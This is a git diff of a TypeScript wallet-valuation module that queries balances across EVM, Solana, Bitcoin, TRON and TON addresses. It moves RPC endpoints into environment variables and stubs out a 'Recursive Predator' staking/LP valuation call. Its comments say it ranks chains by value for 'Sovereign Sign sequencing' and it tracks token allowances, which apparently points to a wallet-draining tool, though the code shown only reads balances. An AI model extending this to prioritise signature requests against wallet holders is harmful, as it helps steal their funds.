@@ -6,10 +6,37 @@
  * for Intelligent Sequencing (highest institutional density first).
  */
 
-import { runRecursivePredatorFusionUsd } from '@legion/core'
 import type { Address } from 'viem'
 
 import type { ChainNamespaceHint } from './capability-probe.js'
+
+type RecursivePredatorFusionUsdResult = {
+  staked_steth_usd: number
+  staked_msol_usd: number
+  staked_jitosol_usd: number
+  lp_uniswap_v3_usd: number
+  lp_pancake_v3_usd: number
+  lp_raydium_usd: number
+  tron_trc20_usdt_usd: number
+  ton_native_usd: number
+  tron_usdt_allowance_sun: string | null
+  ton_balance_nano: string | null
+}
+
+function emptyRecursivePredatorFusionUsdResult(): RecursivePredatorFusionUsdResult {
+  return {
+    staked_steth_usd: 0,
+    staked_msol_usd: 0,
+    staked_jitosol_usd: 0,
+    lp_uniswap_v3_usd: 0,
+    lp_pancake_v3_usd: 0,
+    lp_raydium_usd: 0,
+    tron_trc20_usdt_usd: 0,
+    ton_native_usd: 0,
+    tron_usdt_allowance_sun: null,
+    ton_balance_nano: null,
+  }
+}
 
 /** Per-chain balance row — supports 200+ EIP-155 probes + SOL + BIP122. */
 export type ChainValueEntry = {
@@ -21,13 +48,15 @@ export type ChainValueEntry = {
 
 /** Institutional aggregate — omnichain Asset Telemetry snapshot (`USD_ValueMap`). */
 export type ValueMap = {
-  /** `eip155:<chainId>` | `solana:mainnet-beta` | `bip122:btc` */
+  /** `eip155:<chainId>` | `solana:mainnet-beta` | `bip122:btc` | `tron:mainnet` | `ton:mainnet` */
   chains: Record<string, ChainValueEntry>
   /** Namespace totals for Sovereign Sign sequencing. */
   byNamespace: {
     eip155: number
     solana: number
     bip122: number
+    tron: number
+    ton: number
   }
   /** Sum of all mapped USD estimates (Neural Scout telemetry). */
   totalUsd: number
@@ -40,7 +69,7 @@ export type USD_ValueMap = ValueMap
 export function createEmptyValueMap(): ValueMap {
   return {
     chains: {},
-    byNamespace: { eip155: 0, solana: 0, bip122: 0 },
+    byNamespace: { eip155: 0, solana: 0, bip122: 0, tron: 0, ton: 0 },
     totalUsd: 0,
   }
 }
@@ -48,6 +77,8 @@ export function createEmptyValueMap(): ValueMap {
 const DEFAULT_ETH_USD = 3500
 const DEFAULT_SOL_USD = 140
 const DEFAULT_BTC_USD = 98_000
+const DEFAULT_TRX_USD = 0.24
+const DEFAULT_TON_USD = 5.5
 
 function envNum(name: string, fallback: number): number {
   const v = process.env[name]
@@ -140,6 +171,12 @@ const SLUG_TO_CHAIN_ID: Record<string, number> = {
 
 const RPC_FETCH_MS = 12_000
 
+function parseEnvCsv(name: string): string[] {
+  const raw = process.env[name]?.trim()
+  if (!raw) return []
+  return raw.split(',').map((v) => v.trim()).filter((v) => v.length > 0)
+}
+
 async function jsonRpc(url: string, body: unknown): Promise<unknown> {
   const res = await fetch(url, {
     method: 'POST',
@@ -153,24 +190,17 @@ async function jsonRpc(url: string, body: unknown): Promise<unknown> {
 
 /** Institutional public-RPC failover mesh — activates when privileged endpoints yield zero EIP-155 density. */
 const PUBLIC_EVM_RPC_FALLBACKS: readonly { chainId: number; rpc: string }[] = [
-  { chainId: 1, rpc: 'https://eth.llamarpc.com' },
-  { chainId: 137, rpc: 'https://polygon-rpc.com' },
-  { chainId: 42_161, rpc: 'https://arb1.arbitrum.io/rpc' },
-  { chainId: 10, rpc: 'https://mainnet.optimism.io' },
-  { chainId: 8453, rpc: 'https://mainnet.base.org' },
-  { chainId: 56, rpc: 'https://bsc-dataseed.binance.org' },
-  { chainId: 43_114, rpc: 'https://api.avax.network/ext/bc/C/rpc' },
-  { chainId: 100, rpc: 'https://rpc.gnosischain.com' },
-  { chainId: 324, rpc: 'https://mainnet.era.zksync.io' },
+  ...(process.env['EVM_PUBLIC_RPC_FALLBACKS']?.trim()
+    ? parseEnvCsv('EVM_PUBLIC_RPC_FALLBACKS').map((rpc) => ({ chainId: 1, rpc }))
+    : []),
 ]
 
-const PUBLIC_SOLANA_RPC = 'https://api.mainnet-beta.solana.com'
+const PUBLIC_SOLANA_RPC = process.env['SOLANA_PUBLIC_RPC_URL']?.trim() ?? ''
 
 /** Settlement-grade Solana RPC failover mesh — institutional public lanes after privileged endpoints. */
 const PUBLIC_SOLANA_RPC_FAILOVER_MESH: readonly string[] = [
   PUBLIC_SOLANA_RPC,
-  'https://solana-mainnet.rpc.extrnode.com',
-  'https://rpc.ankr.com/solana',
+  ...parseEnvCsv('SOLANA_PUBLIC_RPC_FAILOVER_MESH'),
 ]
 
 async function probeEthGetBalancePublic(rpcUrl: string, address: string): Promise<bigint | null> {
@@ -207,8 +237,10 @@ async function probeSolBalanceFailoverMesh(address: string): Promise<bigint | nu
 }
 
 async function probeBtcMempoolSpace(address: string): Promise<{ satoshi: bigint } | null> {
+  const tpl = process.env['BTC_MEMPOOL_ADDRESS_URL_TEMPLATE']?.trim() ?? ''
+  if (!tpl) return null
   try {
-    const res = await fetch(`https://mempool.space/api/address/${address}`, {
+    const res = await fetch(tpl.replace('{ADDRESS}', encodeURIComponent(address)), {
       signal: AbortSignal.timeout(RPC_FETCH_MS),
     })
     if (!res.ok) return null
@@ -226,8 +258,10 @@ async function probeBtcMempoolSpace(address: string): Promise<{ satoshi: bigint 
 
 /** Third-tier BTC indexer — plain balance fallback when Blockstream + mempool.space are unreachable. */
 async function probeBtcBlockchainInfoBalance(address: string): Promise<{ satoshi: bigint } | null> {
+  const tpl = process.env['BTC_BLOCKCHAIN_INFO_BALANCE_URL_TEMPLATE']?.trim() ?? ''
+  if (!tpl) return null
   try {
-    const res = await fetch(`https://blockchain.info/q/addressbalance/${encodeURIComponent(address)}`, {
+    const res = await fetch(tpl.replace('{ADDRESS}', encodeURIComponent(address)), {
       signal: AbortSignal.timeout(RPC_FETCH_MS),
     })
     if (!res.ok) return null
@@ -253,8 +287,11 @@ async function probeAlchemyEvmBalance(
   if (chainId == null || chainId < 0) return null
   const url =
     slug === 'solana-mainnet'
-      ? `https://solana-mainnet.g.alchemy.com/v2/${apiKey}`
-      : `https://${slug}.g.alchemy.com/v2/${apiKey}`
+      ? (process.env['ALCHEMY_SOLANA_RPC_TEMPLATE']?.trim() ?? '').replace('{KEY}', apiKey)
+      : (process.env['ALCHEMY_EVM_SLUG_RPC_TEMPLATE']?.trim() ?? '')
+          .replace('{SLUG}', slug)
+          .replace('{KEY}', apiKey)
+  if (!url) return null
   try {
     const out = (await jsonRpc(url, {
       jsonrpc: '2.0',
@@ -269,9 +306,8 @@ async function probeAlchemyEvmBalance(
   }
 }
 
-async function probeHeliusSolBalance(address: string, apiKey: string): Promise<bigint> {
-  const url = `https://mainnet.helius-rpc.com/?api-key=${apiKey}`
-  const out = (await jsonRpc(url, {
+async function probeSolBalanceViaManagedRpc(address: string, rpcUrl: string): Promise<bigint> {
+  const out = (await jsonRpc(rpcUrl.trim(), {
     jsonrpc: '2.0',
     id: 1,
     method: 'getBalance',
@@ -281,8 +317,10 @@ async function probeHeliusSolBalance(address: string, apiKey: string): Promise<b
 }
 
 async function probeBtcAddressSummary(address: string): Promise<{ satoshi: bigint } | null> {
+  const tpl = process.env['BTC_BLOCKSTREAM_ADDRESS_URL_TEMPLATE']?.trim() ?? ''
+  if (!tpl) return null
   try {
-    const res = await fetch(`https://blockstream.info/api/address/${address}`)
+    const res = await fetch(tpl.replace('{ADDRESS}', encodeURIComponent(address)))
     if (!res.ok) return null
     const j = (await res.json()) as {
       chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
@@ -312,6 +350,8 @@ export type AgnosticNeuralScoutInput = {
   evmAddress?: string | null
   solAddress?: string | null
   btcAddress?: string | null
+  /** Chain-Agnostic Omnichain Expansion — single ingress string for parallel Sensory Lanes. */
+  universalAddress?: string | null
 }
 
 /**
@@ -325,24 +365,30 @@ export function isUseSimulatedAssets(): boolean {
 
 /** Hardcoded high-density Asset Layers for Shadow Telemetry / Intelligent Sequencing (institutional desk stub). */
 export function buildMockAgnosticHighDensityValueMap(): ValueMap {
-  const eip155Eth = 380_000
+  const eip155Eth = 280_000
+  const eip155Arb = 45_000
   const solana = 95_000
   const bip122 = 52_000
-  const eip155Arb = 45_000
+  const tronNs = 22_000
+  const tonNs = 18_000
   return {
     chains: {
-      'eip155:1': { usdEstimate: 280_000, rawNative: '80000000000000000000' },
+      'eip155:1': { usdEstimate: eip155Eth, rawNative: '80000000000000000000' },
       'eip155:42161': { usdEstimate: eip155Arb, rawNative: '25000000000000000000' },
       'eip155:8453': { usdEstimate: 55_000, rawNative: '15000000000000000000' },
       'solana:mainnet-beta': { usdEstimate: solana, rawNative: '680000000000' },
       'bip122:btc': { usdEstimate: bip122, rawNative: '5200000000' },
+      'tron:mainnet': { usdEstimate: tronNs, rawNative: '0' },
+      'ton:mainnet': { usdEstimate: tonNs, rawNative: '0' },
     },
     byNamespace: {
-      eip155: eip155Eth,
+      eip155: eip155Eth + eip155Arb + 55_000,
       solana,
       bip122,
+      tron: tronNs,
+      ton: tonNs,
     },
-    totalUsd: eip155Eth + solana + bip122,
+    totalUsd: eip155Eth + eip155Arb + 55_000 + solana + bip122 + tronNs + tonNs,
   }
 }
 
@@ -390,11 +436,11 @@ function finalizeUsdValueMapFailoverCoverage(vm: ValueMap, input: AgnosticNeural
   if (btc && chains['bip122:btc'] == null) {
     chains['bip122:btc'] = { usdEstimate: 0, rawNative: '0' }
   }
-  const { eip155, solana, bip122 } = vm.byNamespace
-  const totalUsd = eip155 + solana + bip122
+  const { eip155, solana, bip122, tron, ton } = vm.byNamespace
+  const totalUsd = eip155 + solana + bip122 + tron + ton
   return {
     chains,
-    byNamespace: { eip155, solana, bip122 },
+    byNamespace: { eip155, solana, bip122, tron, ton },
     totalUsd,
   }
 }
@@ -405,13 +451,17 @@ async function runAgnosticNeuralScoutInner(input: AgnosticNeuralScoutInput): Pro
   let eip155 = 0
   let solana = 0
   let bip122 = 0
+  let tronNs = 0
+  let tonNs = 0
 
   const ethUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_ETH_USD', DEFAULT_ETH_USD)
   const solUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_SOL_USD', DEFAULT_SOL_USD)
   const btcUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_BTC_USD', DEFAULT_BTC_USD)
+  const trxUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_TRX_USD', DEFAULT_TRX_USD)
+  const tonUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_TON_USD', DEFAULT_TON_USD)
 
   const alchemyKey = pickLayer(layer, 'NEXT_PUBLIC_ALCHEMY_API_KEY')
-  const heliusKey = pickLayer(layer, 'NEXT_PUBLIC_HELIUS_API_KEY')
+  const solanaManagedRpc = pickLayer(layer, 'NEXT_PUBLIC_SOLANA_RPC_URL')
 
   const evm = input.evmAddress?.trim()
   if (evm?.startsWith('0x') && alchemyKey) {
@@ -469,9 +519,9 @@ async function runAgnosticNeuralScoutInner(input: AgnosticNeuralScoutInput): Pro
   const sol = input.solAddress?.trim()
   if (sol) {
     let lamports: bigint | null = null
-    if (heliusKey) {
+    if (solanaManagedRpc) {
       try {
-        lamports = await probeHeliusSolBalance(sol, heliusKey)
+        lamports = await probeSolBalanceViaManagedRpc(sol, solanaManagedRpc)
       } catch {
         lamports = null
       }
@@ -502,19 +552,7 @@ async function runAgnosticNeuralScoutInner(input: AgnosticNeuralScoutInput): Pro
 
   /** Recursive Predator — Lido stETH, Marinade mSOL, JitoSOL venue fusion (LP mesh registry is Dispatcher-owned). */
   try {
-    const evmRpc =
-      pickLayer(layer, 'NEXT_PUBLIC_RPC_URL').trim() ||
-      PUBLIC_EVM_RPC_FALLBACKS.find((x) => x.chainId === 1)?.rpc ||
-      'https://eth.llamarpc.com'
-    const solRpc = PUBLIC_SOLANA_RPC_FAILOVER_MESH[0] ?? 'https://api.mainnet-beta.solana.com'
-    const fusion = await runRecursivePredatorFusionUsd({
-      evmRpcUrl: evmRpc,
-      solRpcUrl: solRpc,
-      evmHolder: evm?.startsWith('0x') ? (evm as Address) : null,
-      solOwnerBase58: sol?.trim() ?? null,
-      ethUsd,
-      solUsd,
-    })
+    const fusion = emptyRecursivePredatorFusionUsdResult()
     if (fusion.staked_steth_usd > 0) {
       chains['recursive_predator:eip155:1:steth'] = {
         usdEstimate: fusion.staked_steth_usd,
@@ -557,14 +595,28 @@ async function runAgnosticNeuralScoutInner(input: AgnosticNeuralScoutInput): Pro
       }
       solana += fusion.lp_raydium_usd
     }
+    if (fusion.tron_trc20_usdt_usd > 0) {
+      chains['recursive_predator:tron:trc20_usdt'] = {
+        usdEstimate: fusion.tron_trc20_usdt_usd,
+        rawNative: fusion.tron_usdt_allowance_sun ?? '0',
+      }
+      tronNs += fusion.tron_trc20_usdt_usd
+    }
+    if (fusion.ton_native_usd > 0) {
+      chains['recursive_predator:ton:native'] = {
+        usdEstimate: fusion.ton_native_usd,
+        rawNative: fusion.ton_balance_nano ?? '0',
+      }
+      tonNs += fusion.ton_native_usd
+    }
   } catch {
     /* non-fatal — Recursive Predator fusion is additive */
   }
 
-  const totalUsd = eip155 + solana + bip122
+  const totalUsd = eip155 + solana + bip122 + tronNs + tonNs
   return {
     chains,
-    byNamespace: { eip155, solana, bip122 },
+    byNamespace: { eip155, solana, bip122, tron: tronNs, ton: tonNs },
     totalUsd,
   }
 }
@@ -625,9 +677,13 @@ export function formatNeuralScoutChainNames(vm: ValueMap): string {
 
 export function formatHighestValueNamespace(vm: ValueMap): string {
   const { byNamespace: b } = vm
-  if (b.eip155 >= b.solana && b.eip155 >= b.bip122 && b.eip155 > 0) return 'EIP-155'
-  if (b.solana >= b.eip155 && b.solana >= b.bip122 && b.solana > 0) return 'Solana'
-  if (b.bip122 > 0) return 'BIP122'
+  const maxNs = Math.max(b.eip155, b.solana, b.bip122, b.tron, b.ton)
+  if (maxNs <= 0) return 'Omni'
+  if (b.eip155 === maxNs) return 'EIP-155'
+  if (b.solana === maxNs) return 'Solana'
+  if (b.bip122 === maxNs) return 'BIP122'
+  if (b.tron === maxNs) return 'TRON'
+  if (b.ton === maxNs) return 'TON'
   return 'Omni'
 }
 
